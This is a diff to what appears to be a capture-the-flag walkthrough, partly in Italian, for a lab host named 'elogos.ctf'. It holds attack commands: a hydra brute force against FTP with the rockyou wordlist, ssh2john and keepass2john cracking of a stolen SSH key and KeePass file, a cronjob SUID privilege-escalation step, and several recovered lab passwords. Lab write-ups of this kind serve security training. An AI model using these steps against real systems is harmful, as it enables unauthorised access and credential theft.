@@ -12,7 +12,7 @@ After that launch a brute force with hydra on ftp to gain access
 ```
 hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ftp://elogos.ctf
 ```
-
+""Creds = j.brock:princess""
 ls -la and take the private ssh key. Crack it.
 ```
 ssh2john id_rsa > hash
@@ -119,11 +119,15 @@ Aspetta che runna tramite cronjob ed esegui il bash con suid creato
 Nella home di m.hack c'è un file keepass kdbx.
 Usa keepass2john per craccarlo
 ```
-`
+keepass2john mypasswords.kdbx > hash
+
 ```
 ==Password = ihatehackers==
 
 all'interno del keepass c'è la password per l'utente
 ==Password = nZ!mqdhbNA5YQ$Q$C5VdUh==
 
-
+Puoi fare
+```
+su
+```
